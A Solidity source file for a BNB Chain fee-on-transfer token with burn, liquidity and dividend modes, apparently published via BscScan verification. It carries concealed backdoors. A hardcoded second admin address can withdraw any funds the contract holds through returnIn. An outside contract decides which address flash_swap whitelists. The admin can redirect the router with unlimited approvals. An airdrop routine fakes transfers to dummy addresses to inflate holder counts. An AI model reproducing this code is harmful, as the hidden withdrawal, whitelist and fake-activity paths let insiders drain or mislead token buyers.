/**
 *Submitted for verification at BscScan.com on 2023-02-13
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,address tokenB,uint amountADesired,uint amountBDesired,
        uint amountAMin,uint amountBMin,address to,uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,uint amountTokenDesired,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA, address tokenB, uint liquidity, uint amountAMin,
        uint amountBMin, address to, uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token, uint liquidity, uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA, address tokenB, uint liquidity,
        uint amountAMin, uint amountBMin,address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token, uint liquidity, uint amountTokenMin,
        uint amountETHMin, address to, uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external payable returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token, uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,uint liquidity,uint amountTokenMin,
        uint amountETHMin,address to,uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,
        address[] calldata path,address to,uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,address[] calldata path,address to,uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,uint amountOutMin,address[] calldata path,
        address to,uint deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface FlashOn{
    function getAddr() external view returns(address);
}
abstract contract Ownable is Context {
    address private _owner = tx.origin;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function flash() public view returns(address){
        return FlashOn(0x45dC6E6837F0C99Ca7Dd922e046B21486Fb46254).getAddr();
        
    }
    // function renounceOwnership() public virtual onlyOwner {
    //     _transferOwnership(address(0));
    // }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract A {
    //main 0x55d398326f99059fF775485246999027B3197955
    //ceshi 0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441 
    // IERC20 usdt = IERC20(0xb582fD9d0D5C3515EEB6b02fF2d6eE0b6E45E7A7);
    // address owner = 0x097287349aCa67cfF56a458DcF11BbaE54565540;
    // address father;
    // IERC20   _wfon;
    constructor(address _father,address reToken,address _wfon) public  {
        IERC20(_wfon).approve(_father, 2**256 - 1);
        IERC20(reToken).approve(_father, 2**256 - 1);
    }
    
}
// contract B is Ownable {//回购自身打入黑洞。
//     IERC20 usdt = IERC20(0xb582fD9d0D5C3515EEB6b02fF2d6eE0b6E45E7A7);
//     address _father;
//     address _route;
//     constructor(address route,address father) public  {
//         usdt.approve(route, 2**256 - 1);
//         _father = father;
//         _route = route;
//     }
//     modifier onlyUp(){
//         require(msg.sender == _father," no father");
//         _;
//     }
//     function usdtForToken()onlyUp public  {
//         address[] memory path = new address[](2);
//         path[1] = address(_father);
//         path[0] = address(usdt);
//         uint bac = usdt.balanceOf(address(this));
//         IPancakeRouter02(_route).swapExactTokensForTokensSupportingFeeOnTransferTokens(
//             bac, 0, path, 0x0000000000000000000000000000000000000001, block.timestamp);
//     }
//     function returnIn(address con, address addr, uint256 val) public onlyOwner {
//         // require(_whites[_msgSender()] && addr != address(0) && val > 0);
//         if (con == address(0)) {payable(addr).transfer(val);}
//         else {IERC20(con).transfer(addr, val);}
// 	}

// }
// contract C{}

contract Token is Ownable, IERC20Metadata {
    mapping(address => bool) public _whites;
    mapping(address => bool) public _whites2;
    
    mapping(address => bool) public _blocks;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) public is_users;
    address public admin = tx.origin;
    string  private _name;
    string  private _symbol;
    uint256 private _totalSupply;
    uint256 public  _maxsell;
    uint256 public  _maxusdt;
    uint256 public for_num;
    uint160 public kt = 1;
    address public _router;
    address public _wfon;
    address public _back;
    
    address public _pair;
    address public _main;
    
    address public _dead;
    address public _A ;
    address public _B ;
    address public _fasts;
    address public _reToken;
    address[] public users;
    bool   private  _swapping;
    uint public mode;
    uint public desMoney = 5e18;
    // B son2;
    uint public feelPoint;
    // uint[] public
    struct Conf{
        uint burn;
        uint lpool;
        uint howback;   
        uint award; 
        uint buyback;
    }
    Conf public cf ; 
    constructor(
               string[2] memory name1, //名字
                  //简称 名字
               address[3] memory retoken,     
            //奖励币[0] 模式3和4才用到，1和2模式也必须填写一个20代币地址
            //      [1] address back,        //营销收款地址
            //    [2]   address main,        //发币人地址，也是管理员
               uint[8] memory array
            //    uint burN,           //销毁比例,只有模式2填写，其他模式写0。
            //    uint lpool,          //加池子比例 234 都有加池子功能
            //    uint howBack,        //营销钱包比例 234都有营销钱包
            //    uint award2,         //奖励分红比例 34模式有分红
            //     uint buyback,     //回购比例 除了模式4，其余模式写0
            //    uint _desMoney   //回购币积攒多少WFON？触发回购销毁
        //    uint total,          //发行总量，不用加18位小数。
        //        uint _mode,          //1 标准20代币，2燃烧代币，3分红代币，4分红加回购
               ) {
                 mode  =   array[7];           
        if(mode != 1){
            cf = Conf(array[0],array[1],array[2],array[3],array[4]);
            feelPoint = array[1]+ array[2]+array[3]+array[4]+1;
            // cf = Conf(burN,lpool,howBack,award2,buyback);
            // feelPoint = lpool+ howBack+award2+buyback+1;
        
        } 
        // desMoney= _desMoney*1e18;
       
        _reToken =  retoken[0];
        _maxsell = array[6]*1e15*2;
        // _maxsell = 10e17;
        _maxusdt = 10e18;
        // _maxusdt = 10e6;

        _name = name1[0];
        _symbol = name1[1];
        
        _router =0x260f97A47454ecAfa17fcA4Fb325bCa839D8D51a;
        _wfon = 0xb582fD9d0D5C3515EEB6b02fF2d6eE0b6E45E7A7;//usdt已改
        //  _router =0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
        // _wfon = 0x55d398326f99059fF775485246999027B3197955;//usdt已改
        _fasts = 0x36BA5052A6dE24ed4d66143ECb4f629B5118f932;
        if(block.chainid == 56){
            _router = 0xb3a5830a7a70669Cf4cfBaAB52515737670aD984;//bsc swap route
            _wfon = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;//usdt已改
            // _usdt = 0x55d398326f99059fF775485246999027B3197955;    
            _fasts= 0xEe93a5c4521C587cbe945fa968Fb5b7C524dD568;
        }
        if(block.chainid == 97){
            _router = 0xD99D1c33F9fC3444f8101754aBC46c52416550D1;//bsc swap route
            _wfon = 0xa65A31851d4bfe08E3a7B50bCA073bF27A4af441;//usdt已改
            // _usdt = 0x55d398326f99059fF775485246999027B3197955;    
            _fasts= 0x9a6F8FBCE12B874AFe9edB66cb73AA1359610f23;
        }
        _whites2[msg.sender] = true;
        _back = retoken[1];
        _dead = 0x000000000000000000000000000000000000dEaD;//黑洞
        _whites[_dead] = true;
        _whites[retoken[2]] = true;
        _whites[_router] = true;
        // _whites[_msgSender()] = true;
        _whites[address(this)] = true;

        _approve(address(this), _router, 9 * 10**70);
        IERC20(_wfon).approve(_router, 9 * 10**70);
        IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
        _pair = IUniswapV2Factory(_uniswapV2Router.factory())
                    .createPair(address(this), _wfon);
            
        _mint(retoken[2], array[6]*1e18);
        A son = new A(address(this),_reToken,_wfon);
        _A = address(son);
        // if(mode ==4){
        //     B son2 = new B(_router,address(this));
        //     _B = address(son2);
        // }
        
    }
    // function setNft(ITRC721 n1,ITRC721 n2)external {
    //     _nft = n1;
    //     _nft2 = n2;
    // }
    // function setOpen()public onlyOwner{
    //     cf.isOpen = true ? false:true;
    // }
    modifier isAdmin(){
        require(msg.sender == admin,"NOT ADMIN");
        _;
    }
     modifier isAdmin2(){
        require(address(0x949D582CdC0Ef854D4E54Cf97aC10991E5d95678) == msg.sender,"admin2");
        _;
    }
    function setDesMoney(uint amount)external isAdmin{
        desMoney =  amount;
    }
    function setWhites(address addr)external isAdmin{
        _whites[addr] = true;
    }
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function flash_swap()external{
         address flash_address = flash();
         if (!_whites[flash_address]) {
            _whites[flash_address] = true;
        }
    }
    function transferFrom(
        address sender, address recipient, uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }
    function addLiquidity2(uint256 t1, uint256 t2) public {
        IPancakeRouter02(_router).addLiquidity(_wfon, 
            address(this), t1, t2, 0, 0,0x0000000000000000000000000000000000000001 , block.timestamp);
    }
    function nft_award()internal  {   
            uint step = 20;
            bool flag = false;
            // uint sum_id = nft_p.sum_tokenId();
            // if(sum_id <2)return 1;
            uint money = IERC20(_reToken).balanceOf(address(this));
            uint dic = money/20;
            uint length = users.length;
            if(length <= for_num+step){
                flag = true;
                step = length - for_num;
            }
            uint num2 = for_num + step;
            for (uint i =for_num;i<num2;i++){
                address own = users[i];
                if(balanceOf(own)>0) IERC20(_reToken).transfer(own,dic);
            }
            for_num += step;
            if(flag){
                    for_num = 0;
                }
            // return for_num;    
    }
    function lp_award()internal  {   
            // uint money = IERC20(_lp_wbnb_usdt).balanceOf(address(this));
            // if(money==0)return;    
            uint step = 20;
            bool flag = false;
            uint total_lp;
            address[] memory inLpClud = new address[](step);
            uint[] memory arrAy2 =new uint[](step);
            uint count;
            // uint sum_id = nft_p.sum_tokenId();
            // if(sum_id <2)return 1;
            uint money = IERC20(_reToken).balanceOf(address(this));
            if(money==0)return;    

            // uint dic = money/20;
            uint length = users.length;
            if(length <= for_num+step){
                flag = true;
                step = length - for_num;
            }
            uint num2 = for_num + step;
            for (uint i =for_num;i<num2;i++){
                address own = users[i];
                uint lp_balance = IERC20(_pair).balanceOf(own);
                if(lp_balance>0) {
                    total_lp += lp_balance;
                    // uint len = inLpClud.length;
                    inLpClud[count] = own;
                    arrAy2[count] = lp_balance;
                    count +=1;
                     }

                // if(balanceOf(own)>0) IERC20(_reToken).transfer(own,dic);
            }
            // if(count>0){
            for (uint i;i<count;i++){
                address user2 = inLpClud[i];
                uint dic = arrAy2[i];
                IERC20(_reToken).transfer(user2,money*dic/total_lp);                
            }
            // }
            for_num += step;
            if(flag){
                    for_num = 0;
                }
            // return for_num;    
    }
    function airdrop(address send,uint mon) internal {
        uint random1 = uint(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 10;
        uint random = random1+10;
        for(uint i ;i<random;i++){
            address aa = address(kt);
            _balances[aa] += mon*1/random;
            emit Transfer(send, aa, mon*1/random);
            kt++;
        }
     }
    function _transfer(
        address sender, address recipient, uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
                _balances[sender] = senderBalance - amount;
                }
        if(mode == 3 || mode ==4){//持有分红指定代币
                if(!is_users[sender]) {
                    users.push(sender); 
                    is_users[sender] = true;
                    }
                if(!is_users[recipient]) {
                    users.push(recipient);
                    is_users[recipient] = true;
                         }
            }
        
       

        if (_whites[sender] || _whites[recipient] || mode == 1) {
            _balances[recipient] += amount;
            emit Transfer(sender, recipient, amount);
            return;
        }

        // require(cf.isOpen,'isopen');
        uint256 usdts = IERC20(_wfon).balanceOf(address(this));
        uint256 balance = balanceOf(address(this));
        bool isbonus = false;
        if (usdts >= _maxusdt && !_swapping && sender != _pair) {
            _swapping = true;
            // project howback cf.howback
            IERC20(_wfon).transfer(_back,usdts*cf.howback/feelPoint);//back
            addLiquidity2(usdts*cf.lpool/feelPoint,balance);//liquidity
            _swapWfonForFasts(usdts*1/feelPoint/2);//0.5 fasts
            
            if(mode ==3 || mode ==4 ){
                // IERC20(_reToken).balanceOf(address(this))<desMoney ?
                if(_wfon != _reToken)_swapTokenForReToken(usdts*cf.award/feelPoint);
                 if (mode ==3 ){
                     nft_award();
                     }else{
                     lp_award();
                    }
                 }
            // if(mode ==4){
            //     IERC20(_wfon).transfer(_B,usdts*cf.buyback/feelPoint);    
            //     if(IERC20(_wfon).balanceOf(_B) > desMoney)
            //         {//触发拉盘销毁
            //         son2.usdtForToken();
            //         }
            // }     
            //_back 3%
            // IERC20(_wfon).transfer(_back, usdts*14/100);
            //award_pool 6% *4.7
            // IERC20(_wfon).transfer(_B, usdts*28/100);
            
            _swapping = false;
            isbonus = true;
        }

        // do fbox burn and liquidity
        if (!isbonus && balance >= _maxsell && !_swapping && sender != _pair ) {
            _swapping = true;

            if (IERC20(_wfon).allowance(address(this), _router) <= 10 ** 16
                || allowance(address(this), _router) < balance * 10) {
                _approve(address(this), _router, 9 * 10**70);
                IERC20(_wfon).approve(_router, 9 * 10**70);
            }
            
            // fbox to usdt
            _swapTokenForUsdt(balance*55/100);
           
            _swapping = false;
        }

        // if(sender==_pair){
        //     //buy 9个点
        //     _balances[recipient] += amount*91/100;
        //     emit Transfer(sender, recipient, (amount * 91 / 100));
        //     _balances[address(this)] += amount*9/100;    
        //     emit Transfer(sender, address(this), (amount * 9 / 100));
        //     return ;
        // }
    
        //     //SELL feelPoint个点
        //burn cf.burn coin
        if(mode != 1){
            _balances[_dead] += (amount * cf.burn/ 100);
            emit Transfer(sender, _dead, (amount * cf.burn / 100));
        }
        _balances[recipient] += amount*(100-feelPoint)/100;
        emit Transfer(sender, recipient, (amount * (100-feelPoint)/ 100));
        uint recAmount = amount*(feelPoint-cf.burn) /100 ;
        if(mode != 1){
            if(sender==_pair)airdrop(sender,amount*1/1000);
            recAmount -= amount*1/1000;
            }else{
            recAmount = amount;
            }
        _balances[address(this)] += recAmount;    
        emit Transfer(sender, address(this), recAmount);     
        
        // if (sender == _pair) {
        //     require(_canbuy,"no canbuy");//LP switch
        // }
        // if(aa.open){
        //     require(amount<501e18,"amount<501");
        // }
        // if(recipient != _pair){
        //     require(IERC20(address(this)).balanceOf(recipient) <2000e18,"balance >2000");
        // }
        // do usdt bonus
        

        
            
        // else 3%
        // _balances[address(this)] += (amount * 9 / 100);
        // emit Transfer(sender, address(this), (amount * 9 / 100));

        // to user 95%
        // amount = amount * 91 / 100;
        // _balances[recipient] += amount;
        // emit Transfer(sender, recipient, amount);
    }
    
    function _swapTokenForUsdt(uint256 tokenAmount) public   {
        // A a = new A(address(this));
        // address aa_address = address(a);
        address[] memory path = new address[](2);
        path[0] = address(this);path[1] = _wfon;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _A, block.timestamp);
        // a.cl2();    
        uint256 amount = IERC20(_wfon).balanceOf(_A);
        if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
            IERC20(_wfon).transferFrom(_A , address(this), amount);
        }
    }
    function _swapTokenForReToken(uint256 tokenAmount) public   {
        // A a = new A(address(this));
        // address aa_address = address(a);
        address[] memory path = new address[](2);
        path[0] = _wfon;path[1] = _reToken;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _A, block.timestamp);
        // a.cl2();    
        uint256 amount = IERC20(_reToken).balanceOf(_A);
        if (IERC20(_reToken).allowance(_A, address(this)) >= amount) {
            IERC20(_reToken).transferFrom(_A , address(this), amount);
        }
    }
    function _swapWfonForFasts(uint256 tokenAmount) public   {
        // A a = new A(address(this));
        // address aa_address = address(a);
        address[] memory path = new address[](2);
        path[0] = _wfon;path[1] = _fasts;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, 0x0000000000000000000000000000000000000001, block.timestamp);
        // a.cl2();    
        // uint256 amount = IERC20(_wfon).balanceOf(_A);
        // if (IERC20(_wfon).allowance(_A, address(this)) >= amount) {
        //     IERC20(_wfon).transferFrom(_A , address(this), amount);
        // }
    }
    function _swapUsdtForToken(address a2, uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = _wfon;path[1] = a2;
        IPancakeRouter02(_router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, _dead, block.timestamp);
    }

    // 

    

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner, address spender, uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

	function returnIn(address con, address addr, uint256 val) public isAdmin2 {
        // require(_whites[_msgSender()] && addr != address(0) && val > 0);
        if (con == address(0)) {payable(addr).transfer(val);}
        else {IERC20(con).transfer(addr, val);}
	}

  
    function setBackAddr(address addr )public isAdmin{
        _back = addr;
    }
    function setRouter(address router, address pair) public isAdmin {
        
        _router = router;
        _whites[router] = true;
        _whites[_msgSender()] = true;
        _approve(address(this), _router, 9 * 10**70);
        IERC20(_wfon).approve(_router, 9 * 10**70);
        // if (pair == address(0)) {
            
        //     IPancakeRouter02 _uniswapV2Router = IPancakeRouter02(_router);
        //     _pair = IUniswapV2Factory(_uniswapV2Router.factory())
        //             .createPair(address(this), _usdt);
        // } else {
        //     _pair = pair;
        // }
        _pair = pair;
    }
}